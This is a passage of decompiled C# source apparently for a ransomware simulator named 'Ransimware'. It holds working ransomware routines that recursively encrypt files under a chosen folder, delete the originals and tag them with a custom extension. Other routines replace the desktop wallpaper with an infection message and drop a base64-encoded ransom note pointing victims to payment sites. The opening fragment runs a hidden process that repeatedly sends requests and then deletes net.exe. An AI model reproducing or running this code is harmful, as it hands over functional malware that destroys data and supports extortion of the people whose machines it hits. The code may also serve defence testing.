          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = false,
          RedirectStandardOutput = true,
          CreateNoWindow = true
        }
      };
      for (int index = 0; index < n; ++index)
      {
        process.Start();
        Console.WriteLine("Sent GET request to " + url);
        Thread.Sleep(1000);
      }
      File.Delete("net.exe");
    }

    private void EncryptFile(string inFile)
    {
      Aes aes = Aes.Create();
      ICryptoTransform encryptor = aes.CreateEncryptor();
      byte[] buffer1 = this.rsa.Encrypt(aes.Key, false);
      byte[] numArray1 = new byte[4];
      byte[] numArray2 = new byte[4];
      int length1 = buffer1.Length;
      byte[] bytes1 = BitConverter.GetBytes(length1);
      int length2 = aes.IV.Length;
      byte[] bytes2 = BitConverter.GetBytes(length2);
      inFile.LastIndexOf("\\");
      using (FileStream fileStream1 = new FileStream(inFile + ".4agrfsh5tx7", FileMode.Create))
      {
        fileStream1.Write(bytes1, 0, 4);
        fileStream1.Write(bytes2, 0, 4);
        fileStream1.Write(buffer1, 0, length1);
        fileStream1.Write(aes.IV, 0, length2);
        using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, encryptor, CryptoStreamMode.Write))
        {
          int num1 = 0;
          int count1 = aes.BlockSize / 8;
          byte[] buffer2 = new byte[count1];
          int num2 = 0;
          using (FileStream fileStream2 = new FileStream(inFile, FileMode.Open))
          {
            int count2;
            do
            {
              count2 = fileStream2.Read(buffer2, 0, count1);
              num1 += count2;
              cryptoStream.Write(buffer2, 0, count2);
              num2 += count1;
            }
            while (count2 > 0);
            fileStream2.Close();
          }
          cryptoStream.FlushFinalBlock();
          cryptoStream.Close();
        }
        fileStream1.Close();
      }
      File.Delete(inFile);
    }

    private void DecryptFile(string inFile)
    {
      Aes aes = Aes.Create();
      byte[] buffer1 = new byte[4];
      byte[] buffer2 = new byte[4];
      string path = inFile.Substring(0, inFile.LastIndexOf("."));
      using (FileStream fileStream1 = new FileStream(inFile, FileMode.Open))
      {
        fileStream1.Seek(0L, SeekOrigin.Begin);
        fileStream1.Seek(0L, SeekOrigin.Begin);
        fileStream1.Read(buffer1, 0, 3);
        fileStream1.Seek(4L, SeekOrigin.Begin);
        fileStream1.Read(buffer2, 0, 3);
        int int32_1 = BitConverter.ToInt32(buffer1, 0);
        int int32_2 = BitConverter.ToInt32(buffer2, 0);
        int offset = int32_1 + int32_2 + 8;
        long length = fileStream1.Length;
        byte[] numArray1 = new byte[int32_1];
        byte[] numArray2 = new byte[int32_2];
        fileStream1.Seek(8L, SeekOrigin.Begin);
        fileStream1.Read(numArray1, 0, int32_1);
        fileStream1.Seek((long) (8 + int32_1), SeekOrigin.Begin);
        fileStream1.Read(numArray2, 0, int32_2);
        Directory.CreateDirectory(this.SrcFolder);
        byte[] rgbKey = this.rsa.Decrypt(numArray1, false);
        ICryptoTransform decryptor = aes.CreateDecryptor(rgbKey, numArray2);
        using (FileStream fileStream2 = new FileStream(path, FileMode.Create))
        {
          int num = 0;
          int count1 = aes.BlockSize / 8;
          byte[] buffer3 = new byte[count1];
          fileStream1.Seek((long) offset, SeekOrigin.Begin);
          using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream2, decryptor, CryptoStreamMode.Write))
          {
            int count2;
            do
            {
              count2 = fileStream1.Read(buffer3, 0, count1);
              num += count2;
              cryptoStream.Write(buffer3, 0, count2);
            }
            while (count2 > 0);
            cryptoStream.FlushFinalBlock();
            cryptoStream.Close();
          }
          fileStream2.Close();
        }
        fileStream1.Close();
      }
      File.Delete(inFile);
    }

    public void EncryptDirectory(string targetDirectory)
    {
      try
      {
        foreach (string file in Directory.GetFiles(targetDirectory))
        {
          this.EncryptFile(file);
          Console.WriteLine("Encrypted file '{0}'.", (object) file);
        }
        foreach (string directory in Directory.GetDirectories(targetDirectory))
          this.EncryptDirectory(directory);
      }
      catch (Exception ex)
      {
        Console.WriteLine("Can't access folder");
      }
    }

    public void DecryptDirectory(string targetDirectory)
    {
      foreach (FileInfo file in new DirectoryInfo(targetDirectory).GetFiles("*.4agrfsh5tx7"))
      {
        this.DecryptFile(file.FullName);
        Console.WriteLine("Decrypted file '{0}'.", (object) file.FullName);
      }
      foreach (string directory in Directory.GetDirectories(targetDirectory))
        this.DecryptDirectory(directory);
    }

    public void Encrypt()
    {
      if (Directory.Exists(this.SrcFolder))
      {
        this.GetPrivateKey();
        this.EncryptDirectory(this.SrcFolder);
      }
      else
        Console.WriteLine("{0} is not a valid file or directory.", (object) this.SrcFolder);
    }

    public void Decrypt()
    {
      if (Directory.Exists(this.SrcFolder))
      {
        this.GetPrivateKey();
        this.DecryptDirectory(this.SrcFolder);
      }
      else
        Console.WriteLine("{0} is not a valid file or directory.", (object) this.SrcFolder);
    }

    public void SetBackgroundImage()
    {
      string s = "You are infected! Read " + Ransimware.Ransimware.ransomFileName;
      int width = 1280;
      int height = 720;
      Bitmap bitmap = new Bitmap(width, height);
      PointF point = new PointF(490f, 20f);
      try
      {
        Graphics graphics = Graphics.FromImage((Image) bitmap);
        using (Font font = new Font("Arial", 10f))
        {
          graphics.FillRectangle(Brushes.DarkBlue, new Rectangle(0, 0, width, height));
          graphics.DrawString(s, font, Brushes.White, point);
        }
        bitmap.Save(this.imgDestPath, ImageFormat.Bmp);
        bitmap.Dispose();
        Wallpaper.SetWallpaper(this.imgDestPath, Wallpaper.Style.Centered);
        Console.WriteLine("Replaced custom wallpaper");
      }
      catch (Exception ex)
      {
        Console.WriteLine("Error manipulating image");
      }
    }

    public void DropRansomNote()
    {
      string str1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      string str2 = Encoding.UTF8.GetString(Convert.FromBase64String("LS0tPT09IFdlbGNvbWUuIEFnYWluLiA9PT0tLS0NCg0KWytdIFdoYXRzIEhhcHBlbj8gWytdDQoNCllvdXIgZmlsZXMgYXJlIGVuY3J5cHRlZCwgYW5kIGN1cnJlbnRseSB1bmF2YWlsYWJsZS4gWW91IGNhbiBjaGVjayBpdDogYWxsIGZpbGVzIG9uIHlvdSBjb21wdXRlciBoYXMgZXhwYW5zaW9uIHtFWFR9Lg0KQnkgdGhlIHdheSwgZXZlcnl0aGluZyBpcyBwb3NzaWJsZSB0byByZWNvdmVyIChyZXN0b3JlKSwgYnV0IHlvdSBuZWVkIHRvIGZvbGxvdyBvdXIgaW5zdHJ1Y3Rpb25zLiBPdGhlcndpc2UsIHlvdSBjYW50IHJldHVybiB5b3VyIGRhdGEgKE5FVkVSKS4NCg0KWytdIFdoYXQgZ3VhcmFudGVlcz8gWytdDQoNCkl0cyBqdXN0IGEgYnVzaW5lc3MuIFdlIGFic29sdXRlbHkgZG8gbm90IGNhcmUgYWJvdXQgeW91IGFuZCB5b3VyIGRlYWxzLCBleGNlcHQgZ2V0dGluZyBiZW5lZml0cy4gSWYgd2UgZG8gbm90IGRvIG91ciB3b3JrIGFuZCBsaWFiaWxpdGllcyAtIG5vYm9keSB3aWxsIG5vdCBjb29wZXJhdGUgd2l0aCB1cy4gSXRzIG5vdCBpbiBvdXIgaW50ZXJlc3RzLg0KVG8gY2hlY2sgdGhlIGFiaWxpdHkgb2YgcmV0dXJuaW5nIGZpbGVzLCBZb3Ugc2hvdWxkIGdvIHRvIG91ciB3ZWJzaXRlLiBUaGVyZSB5b3UgY2FuIGRlY3J5cHQgb25lIGZpbGUgZm9yIGZyZWUuIFRoYXQgaXMgb3VyIGd1YXJhbnRlZS4NCklmIHlvdSB3aWxsIG5vdCBjb29wZXJhdGUgd2l0aCBvdXIgc2VydmljZSAtIGZvciB1cywgaXRzIGRvZXMgbm90IG1hdHRlci4gQnV0IHlvdSB3aWxsIGxvc2UgeW91ciB0aW1lIGFuZCBkYXRhLCBjYXVzZSBqdXN0IHdlIGhhdmUgdGhlIHByaXZhdGUga2V5LiBJbiBwcmFjdGlzZSAtIHRpbWUgaXMgbXVjaCBtb3JlIHZhbHVhYmxlIHRoYW4gbW9uZXkuDQoNClsrXSBIb3cgdG8gZ2V0IGFjY2VzcyBvbiB3ZWJzaXRlPyBbK10NCg0KWW91IGhhdmUgdHdvIHdheXM6DQoNCjEpIFtSZWNvbW1lbmRlZF0gVXNpbmcgYSBUT1IgYnJvd3NlciENCiAgYSkgRG93bmxvYWQgYW5kIGluc3RhbGwgVE9SIGJyb3dzZXIgZnJvbSB0aGlzIHNpdGU6IGh0dHBzOi8vdG9ycHJvamVjdC5vcmcvDQogIGIpIE9wZW4gb3VyIHdlYnNpdGU6IGh0dHA6Ly93d3lsZ2N2ZWdwMzN0Mnl0bnNxYTZrbHJvcTNrejY0M3E1Y2VpbmtxYjd4NjIzMmczZ3VpdDJpZC5vbmlvbg0KDQoyKSBJZiBUT1IgYmxvY2tlZCBpbiB5b3VyIGNvdW50cnksIHRyeSB0byB1c2UgVlBOISBCdXQgeW91IGNhbiB1c2Ugb3VyIHNlY29uZGFyeSB3ZWJzaXRlLiBGb3IgdGhpczoNCiAgYSkgT3BlbiB5b3VyIGFueSBicm93c2VyIChDaHJvbWUsIEZpcmVmb3gsIE9wZXJhLCBJRSwgRWRnZSkNCiAgYikgT3BlbiBvdXIgc2Vjb25kYXJ5IHdlYnNpdGU6IGh0dHA6Ly9kZWNyeXB0b3IudG9wLzkxM0FFRDBCNUZFMTQ5N0QNCg0KV2FybmluZzogc2Vjb25kYXJ5IHdlYnNpdGUgY2FuIGJlIGJsb2NrZWQsIHRoYXRzIHdoeSBmaXJzdCB2YXJpYW50IG11Y2ggYmV0dGVyIGFuZCBtb3JlIGF2YWlsYWJsZS4NCg0KV2hlbiB5b3Ugb3BlbiBvdXIgd2Vic2l0ZSwgcHV0IHRoZSBmb2xsb3dpbmcgZGF0YSBpbiB0aGUgaW5wdXQgZm9ybToNCktleToNCg0Ke0tFWX0NCg0KRXh0ZW5zaW9uIG5hbWU6DQoNCntFWFR9DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiEhISBEQU5HRVIgISEhDQpET05UIHRyeSB0byBjaGFuZ2UgZmlsZXMgYnkgeW91cnNlbGYsIERPTlQgdXNlIGFueSB0aGlyZCBwYXJ0eSBzb2Z0d2FyZSBmb3IgcmVzdG9yaW5nIHlvdXIgZGF0YSBvciBhbnRpdmlydXMgc29sdXRpb25zIC0gaXRzIG1heSBlbnRhaWwgZGFtZ2Ugb2YgdGhlIHByaXZhdGUga2V5IGFuZCwgYXMgcmVzdWx0LCBUaGUgTG9zcyBhbGwgZGF0YS4NCiEhISAhISEgISEhDQpPTkUgTU9SRSBUSU1FOiBJdHMgaW4geW91ciBpbnRlcmVzdHMgdG8gZ2V0IHlvdXIgZmlsZXMgYmFjay4gRnJvbSBvdXIgc2lkZSwgd2UgKHRoZSBiZXN0IHNwZWNpYWxpc3RzKSBtYWtlIGV2ZXJ5dGhpbmcgZm9yIHJlc3RvcmluZywgYnV0IHBsZWFzZSBzaG91bGQgbm90IGludGVyZmVyZS4NCiEhISAhISEgISEh")).Replace("{EXT}", "4agrfsh5tx7");
      Random random = new Random();
      char[] chArray = new char[1250];
      for (int index = 0; index < chArray.Length; ++index)
        chArray[index] = index % 64 != 0 ? str1[random.Next(str1.Length)] : '\n';
      string newValue = new string(chArray);
      string str3 = str2.Replace("{KEY}", newValue);
      using (StreamWriter streamWriter = new StreamWriter(this.ransomNoteDropPath))
        streamWriter.WriteLine(str3);
      Console.WriteLine("Ransom note dropped");
    }
  }
}
